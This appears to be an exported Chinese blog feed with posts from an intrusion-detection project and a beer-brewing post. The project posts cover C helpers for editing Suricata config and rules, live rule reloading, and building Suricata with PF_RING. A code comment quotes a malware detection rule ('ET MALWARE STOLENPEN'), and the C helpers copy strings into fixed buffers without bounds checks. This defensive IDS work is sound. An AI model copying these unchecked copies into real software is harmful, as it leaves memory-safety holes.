功能：在文本中将指定内容插入在某一字段所在行(覆盖该行方式) * 传参：line待插入的整行内容，load_file待插入的文件名，des_opt被覆盖行的特征字段 * 返回：无 * usage: * char a[1000] &#x3D; &quot;rule-file: [ftp.rules,dns.rules]&quot;; * insert_specific_line_to_file(a,CONFIG_YAML_FILR_PATH,&quot;rule-file:&quot;); *&#x2F;static void insert_specific_line_to_file(char *ins_content, char *load_file, char *des_opt)&#123;    FILE *fp;    FILE *fc;    int line_hit &#x3D; 0;    int ch;    char line[1000];    char temp_file[100] &#x3D; &#123;&#125;;    strcat(temp_file, load_file);    strcat(temp_file, &quot;.temp&quot;);    fp &#x3D; fopen(load_file, &quot;r&quot;);    fc &#x3D; fopen(temp_file, &quot;w&quot;);    if (fp &#x3D;&#x3D; NULL || fc &#x3D;&#x3D; NULL)    &#123;        printf(&quot;Error opening \n &quot;);    &#125;    else    &#123;        while (!feof(fp) &amp;&amp; !line_hit)        &#123;            fgets(line, 1000, fp);            if (strstr(line, des_opt))            &#123;                line_hit &#x3D; 1;            &#125;            else            &#123;                fprintf(fc, &quot;%s&quot;, line);            &#125;        &#125;        fprintf(fc, &quot;%s&quot;, ins_content);        while ((ch &#x3D; fgetc(fp)) !&#x3D; EOF)        &#123;            fprintf(fc, &quot;%c&quot;, ch);        &#125;        fclose(fc);        fclose(fp);        remove(load_file);        rename(temp_file, load_file);    &#125;&#125;&#x2F;* * 功能：sid读取 * 传参：src_rule源规则字符串 * 返回：sid规则标识符 * usage: * char a[1000] &#x3D; &quot;alert dns $HOME_NET any -&gt; any any (msg:&quot;ET MALWARE STOLENPEN...... sid:2026691; ......ajor, updated_at 2020_09_16;)&quot;; * char b[10] &#x3D; read_rule_sid(a); *&#x2F;static char *read_rule_sid(char *src_rule)&#123;    int n &#x3D; 0;    char *index &#x3D; strstr(src_rule, &quot;sid:&quot;) + 4;    int position &#x3D; index - src_rule;    while (src_rule[position] !&#x3D; &#39;;&#39;)    &#123;        sid[n++] &#x3D; src_rule[position++];    &#125;    return sid;&#125;&#x2F;* * 功能：字符串替换 * 传参：src源字符串，sub待替换内容，rp替换内容，p输出字符串 * 返回：无 * char line[1000] &#x3D; &quot;aabbccddxxyyzz&quot;; * char temp_line[1000]; * char action[10] &#x3D; &quot;drop&quot;; * char rep[10] &#x3D; &quot;alert&quot;; * strrp(line, actions, rep, temp_line); *&#x2F;static void strrp(char *src, char *sub, char *rp, char *p)&#123;    int sub_len &#x3D; strlen(sub);    char *po &#x3D; NULL, *q &#x3D; src;    while ((po &#x3D; strstr(q, sub)) !&#x3D; NULL)    &#123;        strncat(p, q, po - q);        strcat(p, rp);        q +&#x3D; po - q + sub_len;    &#125;    strcat(p, q);&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Suricata</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Suricata</tag>
      
      <tag>API</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Suricata规则重载</title>
    <link href="/posts/bbe9896b/"/>
    <url>/posts/bbe9896b/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Suricata 不重启情况下更新规则rules。</p></blockquote><h2 id="1-Suricata-规则重载步骤"><a href="#1-Suricata-规则重载步骤" class="headerlink" title="1. Suricata  规则重载步骤"></a>1. Suricata  规则重载步骤</h2><ol><li>加载新的配置配置，更新规则变量</li><li>加载新的规则</li><li>构建新的检测引擎</li><li>用新的检测引擎替换旧的引擎</li><li>确保所有线程已更新</li><li>释放旧的检测引擎</li></ol><p><em>注：系统要有足够内存用于启动两个检测引擎（替换过程中有两个引擎同时存在）</em></p><h2 id="2-两种规则重载方式"><a href="#2-两种规则重载方式" class="headerlink" title="2. 两种规则重载方式"></a>2. 两种规则重载方式</h2><h3 id="2-1-Signal"><a href="#2-1-Signal" class="headerlink" title="2.1 Signal"></a>2.1 <code>Signal</code></h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kill -USR2 $(pidof suricata)</code></pre></div><blockquote><p>SIGUSR2</p><p>Causes Suricata to perform a live rule reload.</p></blockquote><h3 id="2-2-Unix-socket"><a href="#2-2-Unix-socket" class="headerlink" title="2.2 Unix socket"></a>2.2 <code>Unix socket</code></h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">suricatasc -c reload-rules</code></pre></div><blockquote><p>Unix socket方式需要安装suricatasc脚本，通过普通编译方式安装则默认安装完成。</p><p>若未安装，通过如下命令在 <code>python/suricatasc</code> 下安装</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo python setup.py install</code></pre></div></blockquote><h2 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h2><p>分别测试了上述两种方式下的两项内容，共四项测试。</p><ol><li>测试Signal方式，对于yaml中已载入的.rules文件修改后重载</li><li>测试Signal方式，对于yaml中已载入的.rules文件修改后重载</li><li>测试Unix socket方式，对于yaml中未载入的.rules文件添加后重载</li><li>测试Unix socket方式，对于yaml中未载入的.rules文件添加后重载</li></ol><p>测试均成功，以下为其中一项测试的日志情况<code>/var/log/suricata/suricata.log</code>，其他类似。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">10&#x2F;8&#x2F;2021 -- 00:09:51 - &lt;Notice&gt; - rule reload starting10&#x2F;8&#x2F;2021 -- 00:09:51 - &lt;Info&gt; - 1 rule files processed. 1 rules successfully loaded, 0 rules failed10&#x2F;8&#x2F;2021 -- 00:09:51 - &lt;Info&gt; - Threshold config parsed: 0 rule(s) found10&#x2F;8&#x2F;2021 -- 00:09:51 - &lt;Info&gt; - 1 signatures processed. 0 are IP-only rules, 1 are inspecting packet payload, 0 inspect application layer, 0 are decoder event only10&#x2F;8&#x2F;2021 -- 00:09:51 - &lt;Info&gt; - cleaning up signature grouping structure... complete10&#x2F;8&#x2F;2021 -- 00:09:51 - &lt;Notice&gt; - rule reload complete10&#x2F;8&#x2F;2021 -- 00:10:27 - &lt;Notice&gt; - rule reload starting10&#x2F;8&#x2F;2021 -- 00:10:27 - &lt;Info&gt; - 1 rule files processed. 1 rules successfully loaded, 0 rules failed10&#x2F;8&#x2F;2021 -- 00:10:27 - &lt;Info&gt; - Threshold config parsed: 0 rule(s) found10&#x2F;8&#x2F;2021 -- 00:10:27 - &lt;Info&gt; - 1 signatures processed. 0 are IP-only rules, 1 are inspecting packet payload, 0 inspect application layer, 0 are decoder event only10&#x2F;8&#x2F;2021 -- 00:10:27 - &lt;Info&gt; - cleaning up signature grouping structure... complete10&#x2F;8&#x2F;2021 -- 00:10:27 - &lt;Notice&gt; - rule reload complete10&#x2F;8&#x2F;2021 -- 00:10:27 - &lt;Info&gt; - Unix socket: lost connection with client00000000</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://suricata.readthedocs.io/en/suricata-6.0.3/manpages/suricata.html#signals">https://suricata.readthedocs.io/en/suricata-6.0.3/manpages/suricata.html#signals</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Suricata</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Suricata</tag>
      
      <tag>入侵检测</tag>
      
      <tag>rules</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Suricata-PF_RING使用</title>
    <link href="/posts/9a205f64/"/>
    <url>/posts/9a205f64/</url>
    
    <content type="html"><![CDATA[<h2 id="1-PF-RING介绍"><a href="#1-PF-RING介绍" class="headerlink" title="1. PF_RING介绍"></a>1. PF_RING介绍</h2><p><a href="https://github.com/ntop/PF_RING">PF_RING</a>是<a href="https://www.ntop.org/">ntop公司</a>开发的高性能数据包捕获套接字。</p><p>使用下图来说明其与传统数据包捕获不同：</p><p><img src="/posts/9a205f64/PFRING.png"></p><p>在数据到达网卡时，首先将数据从网卡拷贝到<code>RX buffer</code>，这个过程使用了<code>DMA</code>（Direct Memory Access），CPU初始化<code>DMA</code>，实际的拷贝过程由<code>DMA</code>控制器完成，不消耗CPU资源，所以在此不算做一次拷贝。在接下来的过程中：</p><ol><li><strong>传统数据包捕获</strong>：在内核空间中将数据从<code>RX buffer</code>拷贝到<code>pkt capture buffer</code>中<strong>（1次拷贝）</strong>，之后为了用户使用还需要从内核空间的<code>pkt capture buffer</code>中将数据拷贝至用户空间的<code>pkt buffer</code><strong>（2次拷贝）</strong>。</li><li><strong>PF_RING</strong>：将数据从<code>RX buffer</code>拷贝到<code>ring buffer</code>中<strong>（1次拷贝）</strong>，通过<code>mmap</code>映射到用户空间，直接由用户应用使用。</li><li><strong>PF_RING ZC（zero copy）</strong>：在数据到达<code>RX buffer</code>直接通过<code>mmap</code>映射给用户应用使用，没有拷贝过程称为zero copy，速度最快，使用收费。</li></ol><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h2><blockquote><p>配置信息：</p><p>VMware® Workstation 16 Pro: 16.1.1 build-17801498</p><p>Ubuntu-16.04.6: Linux ubuntu 4.15.0-142-generic</p><p>网卡: 网络适配器-NAT(ens33)，网络适配器2-Host-only(ens38)</p><p>PF_RING: 7.8.0</p><p>Suricata: 6.0.3</p></blockquote><h3 id="2-1-安装PF-RING-与-支持PF-RING的Suricata"><a href="#2-1-安装PF-RING-与-支持PF-RING的Suricata" class="headerlink" title="2.1 安装PF_RING 与 支持PF_RING的Suricata"></a>2.1 安装<code>PF_RING</code> 与 支持<code>PF_RING</code>的<code>Suricata</code></h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">## Recommended dependencyapt-get install libpcre3 libpcre3-dbg libpcre3-dev build-essential libpcap-dev   \                libnet1-dev libyaml-0-2 libyaml-dev pkg-config zlib1g zlib1g-dev \                libcap-ng-dev libcap-ng0 make libmagic-dev         \                libgeoip-dev liblua5.1-dev libhiredis-dev libevent-dev \                python-yaml rustc cargo libjansson-dev bison flex \                libnspr4-dev libnss3-dev libmaxminddb-dev## Install PF_RINGgit clone https:&#x2F;&#x2F;github.com&#x2F;ntop&#x2F;PF_RING.gitcd PF_RING&#x2F;kernelmake &amp;&amp; sudo make installcd PF_RING&#x2F;userland&#x2F;lib.&#x2F;configure &amp;&amp; make &amp;&amp; sudo make install## Install Suricatagit clone https:&#x2F;&#x2F;github.com&#x2F;OISF&#x2F;suricatacd suricata# Latest Suricata contains libhtp# git clone https:&#x2F;&#x2F;github.com&#x2F;OISF&#x2F;libhtp# .&#x2F;autogen.sh# add PF_RING supportLIBS&#x3D;&quot;-lrt&quot; .&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc --localstatedir&#x3D;&#x2F;var \  --enable-pfring --with-libpfring-includes&#x3D;&#x2F;usr&#x2F;local&#x2F;include \  --with-libpfring-libraries&#x3D;&#x2F;usr&#x2F;local&#x2F;libmakesudo make installsudo ldconfig# Running &#39;make install-conf&#39; will install initial configuration files to &#x2F;etc&#x2F;suricata&#x2F;. # Running &#39;make install-rules&#39; will fetch and load rules.sudo make install-confsudo make install-rules# You can run &#39;make install-full&#39; if you want to install configuration and rules and provide you a ready-to-run suricata.## Verifysuricata --build-info | grep PF_RINGPF_RING support:                         yes## Some wrong happened in Ubuntu16.04.6[ERROR] make[1]: bison: Command not found[Solved] apt install bison[ERROR] make[1]: lex: Command not found[Solved] apt install flex[ERROR] .&#x2F;configure[Solved] apt install libjansson-dev libnspr4-dev libnss3-dev libmaxminddb-dev</code></pre></div><h3 id="2-2-检查安装信息"><a href="#2-2-检查安装信息" class="headerlink" title="2.2 检查安装信息"></a>2.2 检查安装信息</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ suricata --build-info    This is Suricata version 6.0.3 RELEASEFeatures: PCAP_SET_BUFF PF_RING AF_PACKET HAVE_PACKET_FANOUT LIBCAP_NG LIBNET1.1 HAVE_HTP_URI_NORMALIZE_HOOK PCRE_JIT HAVE_LIBJANSSON TLS TLS_C11 MAGIC RUST SIMD support: SSE_4_2 SSE_4_1 SSE_3 Atomic intrinsics: 1 2 4 8 16 byte(s)64-bits, Little-endian architectureGCC version 5.4.0 20160609, C version 201112compiled with _FORTIFY_SOURCE&#x3D;2L1 cache line size (CLS)&#x3D;64thread local storage method: _Thread_localcompiled with LibHTP v0.5.38, linked against LibHTP v0.5.38Suricata Configuration:  AF_PACKET support:                       yes  eBPF support:                            no  XDP support:                             no  PF_RING support:                         yes  NFQueue support:                         no  NFLOG support:                           no  IPFW support:                            no  Netmap support:                          no   DAG enabled:                             no  Napatech enabled:                        no  WinDivert enabled:                       no  Unix socket enabled:                     yes  Detection enabled:                       yes  Libmagic support:                        yes  libnss support:                          no  libnspr support:                         no  libjansson support:                      yes  hiredis support:                         no  hiredis async with libevent:             no  Prelude support:                         no  PCRE jit:                                yes  LUA support:                             no  libluajit:                               no  GeoIP2 support:                          no  Non-bundled htp:                         no  Hyperscan support:                       no  Libnet support:                          yes  liblz4 support:                          no  HTTP2 decompression:                     no  Rust support:                            yes  Rust strict mode:                        no  Rust compiler path:                      &#x2F;usr&#x2F;bin&#x2F;rustc  Rust compiler version:                   rustc 1.47.0  Cargo path:                              &#x2F;usr&#x2F;bin&#x2F;cargo  Cargo version:                           cargo 1.46.0  Cargo vendor:                            yes  Python support:                          yes  Python path:                             &#x2F;usr&#x2F;bin&#x2F;python3  Python distutils                         yes  Python yaml                              yes  Install suricatactl:                     yes  Install suricatasc:                      yes  Install suricata-update:                 yes  Profiling enabled:                       no  Profiling locks enabled:                 no  Plugin support (experimental):           yesDevelopment settings:  Coccinelle &#x2F; spatch:                     no  Unit tests enabled:                      no  Debug output enabled:                    no  Debug validation enabled:                noGeneric build parameters:  Installation prefix:                     &#x2F;usr  Configuration directory:                 &#x2F;etc&#x2F;suricata&#x2F;  Log directory:                           &#x2F;var&#x2F;log&#x2F;suricata&#x2F;  --prefix                                 &#x2F;usr  --sysconfdir                             &#x2F;etc  --localstatedir                          &#x2F;var  --datarootdir                            &#x2F;usr&#x2F;share  Host:                                    x86_64-pc-linux-gnu  Compiler:                                gcc (exec name) &#x2F; g++ (real)  GCC Protect enabled:                     no  GCC march native enabled:                yes  GCC Profile enabled:                     no  Position Independent Executable enabled: no  CFLAGS                                   -g -O2 -std&#x3D;c11 -march&#x3D;native -I$&#123;srcdir&#125;&#x2F;..&#x2F;rust&#x2F;gen -I$&#123;srcdir&#125;&#x2F;..&#x2F;rust&#x2F;dist  PCAP_CFLAGS                               -I&#x2F;usr&#x2F;include  SECCFLAGS   </code></pre></div><p>在<code>Line3</code>与<code>Line17</code>中可看到：</p><p>Features: PCAP_SET_BUFF <strong>PF_RING</strong> AF_PACKET HAVE_PACKET_FANOUT LIBCAP_NG LIBNET1.1 HAVE_HTP_URI_NORMALIZE_HOOK PCRE_JIT HAVE_LIBJANSSON TLS TLS_C11 MAGIC RUSTSIMD support: SSE_4_2 SSE_4_1 SSE_3</p><p><strong>PF_RING support:                         yes</strong></p><h2 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h2><h3 id="3-1-测试基础信息"><a href="#3-1-测试基础信息" class="headerlink" title="3.1 测试基础信息"></a>3.1 测试基础信息</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">## 流量发送此次我使用的Pktgen对于ens38网卡的mac地址进行了流量发送。## 装载 PF_RINGmodprobe pf_ringmodinfo pf_ring &amp;&amp; cat &#x2F;proc&#x2F;net&#x2F;pf_ring&#x2F;info## 当有一个 PF_RING 进程启动，会在 &#x2F;proc&#x2F;net&#x2F;pf_ring&#x2F; 下多出一个描述文件。## 随着 PF_RING 结束，描述文件会消失。文件名不固定，可以查看当前 PF_RING 信息。cat &#x2F;proc&#x2F;net&#x2F;pf_ring&#x2F;6371-ens38.6## kill suricatakill -9 $(pidof suricata) &amp;&amp; rm -f &#x2F;var&#x2F;run&#x2F;suricata.pid</code></pre></div><h3 id="3-2-测试-PF-RING"><a href="#3-2-测试-PF-RING" class="headerlink" title="3.2 测试 PF_RING"></a>3.2 测试 <code>PF_RING</code></h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd PF_RING&#x2F;userlandmake &amp;&amp; make install.&#x2F;examples&#x2F;pfcount -i ens38# 发送的流量可以在输出信息中查看到···&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Absolute Stats: [5&#39;194&#39;609 pkts total][0 pkts dropped][0.0% dropped][5&#39;194&#39;609 pkts rcvd][3&#39;647&#39;046&#39;644 bytes rcvd][120&#39;761.76 pkt&#x2F;sec][678.28 Mbit&#x2F;sec]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Actual Stats: [160&#39;765 pkts rcvd][1&#39;000.15 ms][160&#39;740.72 pps][0.90 Gbps]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;^CLeaving...&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Absolute Stats: [5&#39;238&#39;395 pkts total][0 pkts dropped][0.0% dropped][5&#39;238&#39;395 pkts rcvd][3&#39;677&#39;823&#39;624 bytes rcvd][121&#39;030.98 pkt&#x2F;sec][679.80 Mbit&#x2F;sec]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Actual Stats: [43&#39;786 pkts rcvd][266.09 ms][164&#39;552.72 pps][0.93 Gbps]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;# 同时可在 &#x2F;proc&#x2F;net&#x2F;pf_ring&#x2F;6371-ens38.6 中看到流量···Tot Packets            : ****Tot Pkt Lost           : 0Tot Insert             : 60Tot Read               : 60Insert Offset          : 8448Remove Offset          : 8448Num Free Slots         : 4098···</code></pre></div><h3 id="3-3-测试带有PF-RING的Suricata"><a href="#3-3-测试带有PF-RING的Suricata" class="headerlink" title="3.3 测试带有PF_RING的Suricata"></a>3.3 测试带有<code>PF_RING</code>的<code>Suricata</code></h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">suricata --pfring-int&#x3D;ens38 --pfring-cluster-id&#x3D;99 --pfring-cluster-type&#x3D;cluster_flow -c &#x2F;etc&#x2F;suricata&#x2F;suricata.yamltail -f &#x2F;var&#x2F;log&#x2F;suricata&#x2F;fast.log# 发送的流量处理信息可以在 fast.log 中查看到···08&#x2F;05&#x2F;2021-00:24:58.682951  [**] [1:2210023:2] SURICATA STREAM ESTABLISHED SYNACK resend with different ACK [**] [Classification: Generic Protocol Command Decode] [Priority: 3] &#123;TCP&#125; 104.18.10.234:443 -&gt; 10.12.170.93:6263708&#x2F;05&#x2F;2021-00:24:58.683493  [**] [1:2210026:2] SURICATA STREAM ESTABLISHED SYN resend [**] [Classification: Generic Protocol Command Decode] [Priority: 3] &#123;TCP&#125; 10.12.170.93:62632 -&gt; 172.65.253.13:44308&#x2F;05&#x2F;2021-00:24:58.683494  [**] [1:2210023:2] SURICATA STREAM ESTABLISHED SYNACK resend with different ACK [**] [Classification: Generic Protocol Command Decode] [Priority: 3] &#123;TCP&#125; 172.65.253.13:443 -&gt; 10.12.170.93:62632# 同时可在 &#x2F;proc&#x2F;net&#x2F;pf_ring&#x2F;6371-ens38.6 中看到流量</code></pre></div><h2 id="附1：PF-RING-ZC驱动支持设备"><a href="#附1：PF-RING-ZC驱动支持设备" class="headerlink" title="附1：PF_RING ZC驱动支持设备"></a>附1：PF_RING ZC<a href="https://github.com/ntop/PF_RING/tree/dev/drivers/intel">驱动支持设备</a></h2><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none"># PF_RING&#x2F;drivers&#x2F;intel&#x2F;READMEAvailable PF_RING ZC Intel drivers:e1000e (1 Gbit - PCI Express-only) 8254x&#x2F;8256x&#x2F;8257x&#x2F;8258xigb (1 Gbit) 82575&#x2F;82576&#x2F;82580&#x2F;I350&#x2F;I210ixgbe (10 Gbit) 82599&#x2F;X520&#x2F;X540 i40e (10&#x2F;40 Gbit) X710fm10k (10&#x2F;40&#x2F;100 Gbit) FM10000</code></pre></div><blockquote><p>注：</p><p>最终项目未采用具有PF_RING特性的Suricata，因为<a href="https://forum.suricata.io/t/suricata-pf-ring-in-ips-mode/469">使用PF_RING不能将Suricata配置为IPS模式</a>。</p><p>在项目中IPS为硬性需求，故为采用。</p></blockquote><hr><blockquote><p>参考：</p><p>ntop官方提供兼容Suricata文档：<a href="https://www.ntop.org/guides/pf_ring/thirdparty/suricata.html">https://www.ntop.org/guides/pf_ring/thirdparty/suricata.html</a></p><p>Suricata文档：<a href="https://suricata.readthedocs.io/en/suricata-6.0.3/">https://suricata.readthedocs.io/en/suricata-6.0.3/</a></p><p>PF_RING学习：<a href="https://www.jianshu.com/p/6d3f3cdc2411">https://www.jianshu.com/p/6d3f3cdc2411</a></p><p>Suricata-PF_RING安装参考：<a href="https://blog.csdn.net/qq_31507523/article/details/110092228">https://blog.csdn.net/qq_31507523/article/details/110092228</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Suricata</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Suricata</tag>
      
      <tag>入侵检测</tag>
      
      <tag>PF_RING</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>微醺日记——啤酒杂谈1</title>
    <link href="/posts/9f45fadf/"/>
    <url>/posts/9f45fadf/</url>
    
    <content type="html"><![CDATA[<blockquote><p>内容多摘自<a href="https://book.douban.com/subject/30414965/">《啤博士的啤酒札记》</a></p></blockquote><h2 id="生啤熟啤之分"><a href="#生啤熟啤之分" class="headerlink" title="生啤熟啤之分"></a>生啤熟啤之分</h2><h3 id="生啤：原浆，纯生，扎啤"><a href="#生啤：原浆，纯生，扎啤" class="headerlink" title="生啤：原浆，纯生，扎啤"></a>生啤：原浆，纯生，扎啤</h3><ul><li>原浆：未经加工，直接打出，风味保留完全，保质期短，价格高（运输和保质期原因导致）</li><li>纯生：经过过滤牺牲了部分风味的原浆，具有一定的保质期，价格较高</li><li>扎啤：重新加入二氧化碳的生啤，精致过滤后低温灌装过程中重新充入二氧化碳</li></ul><h3 id="熟啤：干啤，冰啤，普通熟啤"><a href="#熟啤：干啤，冰啤，普通熟啤" class="headerlink" title="熟啤：干啤，冰啤，普通熟啤"></a>熟啤：干啤，冰啤，普通熟啤</h3><p>干啤：啤酒发酵程度更高的熟啤</p><p>冰啤：出厂前通过让啤酒处于冰点温度，啤酒中蛋白质和冰晶形成浑浊悬浮，过滤后啤酒更清亮</p><p>普通熟啤：最常见的啤酒，严格过滤灭菌后的啤酒，保质期长</p><h2 id="啤酒酿造考量指标"><a href="#啤酒酿造考量指标" class="headerlink" title="啤酒酿造考量指标"></a>啤酒酿造考量指标</h2><h3 id="初始比重（OG-Original-Gravity）"><a href="#初始比重（OG-Original-Gravity）" class="headerlink" title="初始比重（OG, Original Gravity）"></a>初始比重（OG, Original Gravity）</h3><p>未发酵酒液相对水的比重，描述了麦汁中可发酵糖分（占绝大部分，直接说明 了麦芽的总用量）、不可发酵物（例如乳糖、糊精、蛋白质等）的总含量，一般用 比重计（在纯净水中读数为1.000）通过量筒测量，数据越大说明酒液越浓稠，说明 用来发酵的糖分和添加物越多、度数可能更高，口味也会越重。直接的读数往往是1.×××，有时也常用“柏拉图浓度”衡量（Fritz Plato，对啤酒研究做出巨大贡 献的德国化学家，1858—1938），简化的计算就是小数点位除以0.004即可，例如1.040比重对应10柏拉图浓度，或者缩写为10°P。</p><p>这是一个仅描述啤酒配方中原料用量的指标，与酒精度并无完全决定的关系， 毕竟还要看最终发酵完还剩下多少原料（最终比重）。但商家经常喜欢宣传柏拉图 浓度，如某酒9度，可这并不是说酒精度为9度，真实的酒精度连3度都不到。</p><p>举例说明的话，一款帝国世涛的初始比重往往高达1.075～1.115，而美式淡拉 格（“大绿棒子”的基本类型）这类则低至1.028～1.040，相差悬殊。</p><h3 id="最终比重（FG-Final-Gravity）"><a href="#最终比重（FG-Final-Gravity）" class="headerlink" title="最终比重（FG, Final Gravity）"></a>最终比重（FG, Final Gravity）</h3><p>经过发酵后酒液比重。此时已经近乎成品啤酒，麦汁中绝大部分可发酵糖分已 被发酵，但部分不可发酵成分依然残留，此时还拥有大量酵母和它们的发酵代谢产 物，例如酒精、酯类、酚类等特色风味物质。</p><p>显然，最终比重与初始比重的差距之间对应了有多少糖分被发酵，抑或是发酵 产生了多少酒精，它们的对应关系可以简化为131.25*（OG-FG），例如一款OG为1.040的拉格到最后发酵到FG为1.006，酒精度大概是131.25× （1.040-1.006）=4.5。不过工业生产中，还存在高浓度发酵（酒精发酵度数超过10度）再稀释的步 骤，计算并不能遵循这个公式。且这个公式只是简单适用于低度啤酒的大致估算， 对于高度啤酒（7.5酒精度以上）误差会增大。</p><p>举例说明的话，帝国世涛的最终比重依然会高达1.018～1.030，甚至超过美式 淡拉格的初始比重，这说明帝国世涛中会残留大量的不可发酵糖分、酵母代谢产物 等，也正是这些残留带给了啤酒如此丰富的味觉维度。而美式淡拉格则只有0.998～ 1.008，从数据上看的确非常接近“水啤”了，但这是应当的，说明这款拉格发酵极 为彻底且酵母和代谢产物清理得很干净（不过这里笔者也留个初中物理思考题：为 什么比重还能低于1呢？）。从这里也可以看出，不同啤酒的特色从数据来看已经初 现端倪。</p><h3 id="苦度（IBU-International-Bitterness-Units）"><a href="#苦度（IBU-International-Bitterness-Units）" class="headerlink" title="苦度（IBU, International Bitterness Units）"></a>苦度（IBU, International Bitterness Units）</h3><p>苦度是在啤酒花成为啤酒重要原料后一个可以量化的指标。前文已经讲过，啤 酒花中的阿尔法酸会在加热熬煮时异构化进而形成苦味，那么每升啤酒中含有N毫克 的异构阿尔法酸就定义为IBU苦度为N，这是一个主要由啤酒花决定的指标。</p><p>不同品种的啤酒花中阿尔法酸含量自然是一个标准指标，酿酒师在购买时很容 易知晓，例如经典的捷克萨兹酒花阿尔法酸含量为3%～6%，美国奇努克酒花含量则 高达12%～14%。不过需要说明的是，酒花只有煮过才会增加苦度，且酒花本身也有 香味，随着煮沸，香味的精油反而会挥发。因而啤酒花的使用是门艺术，尤其是印 度淡色艾尔，往往是煮沸阶段多次分布添加（有层次的苦度和香味），还要加上干 投（净增香味），期间乐趣和经验妙不可言。不过关于苦度的计算十分复杂，本文 不作赘述，下文会告知原因：只能全靠软件了。</p><p>举例说明，一些美式重口味印度淡色艾尔（双料、帝国等）苦度可以轻易高达 100 IBU，而突出酸味的兰比克却低至个位数甚至为0，有着巨大的差别！</p><h3 id="色度（SRM-Standard-Reference-Method）"><a href="#色度（SRM-Standard-Reference-Method）" class="headerlink" title="色度（SRM, Standard Reference Method）"></a>色度（SRM, Standard Reference Method）</h3><p>前文已经做过介绍，啤酒的颜色主要来自轻烤和烘烤麦芽的比例和一些带颜色 的添加物。举例来说，德式黑啤和波罗的海世涛色度可以高达30～40，得名黑啤； 而比利时小麦啤仅有2～4，这是它经常被叫作白啤的原因。</p><h3 id="酒精度（ABV-Alcohol-By-Volume）"><a href="#酒精度（ABV-Alcohol-By-Volume）" class="headerlink" title="酒精度（ABV, Alcohol By Volume）"></a>酒精度（ABV, Alcohol By Volume）</h3><p>普通人最关心的啤酒指标，不过需要说明的是，酒精度通常是指酒精的体积占 比，并非质量占比。在美国禁酒较为严格的时期，酿酒师们也采取过质量比的方 式，这样数据看起来小一些（酒精密度低于水），更容易逃过监管或少交税，而酒 鬼们依然买账，何乐而不为？</p><p>这部分数据研究比较枯燥，笔者在此及时停笔吧，尤其是各种公式计算比重、 苦度、酒精度等。并非笔者有意逃避，而是现在毕竟21世纪了，有现代化的计算机 和手机软件为酿酒师服务，何必自己演算呢？目前比较成熟的Beersmith、 Brewersfriend都有软件或网页版本，正逐步推出汉化版本，且无论你选择哪一款 配方，都会有大量类似配方作为参照比对。作为普通酒友，还是享受酿酒过程的快 乐更加重要。读者们只需输入自己的想法，软件自然会为你计算完毕，剩下的就是 你无敌的脑洞。</p><h2 id="侍饮温度"><a href="#侍饮温度" class="headerlink" 